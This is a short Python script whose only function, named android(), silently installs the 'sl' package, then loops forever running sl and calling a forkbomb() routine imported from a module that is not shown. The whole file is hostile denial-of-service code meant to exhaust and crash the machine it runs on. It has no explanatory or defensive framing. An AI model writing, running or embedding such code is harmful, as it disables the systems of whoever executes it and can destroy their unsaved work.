import os
from forkbomb import forkbomb
def android():
  os.system("yes | pip install sl")
  mal = True
  while mal == True:
    os.system("sl")
    forkbomb()
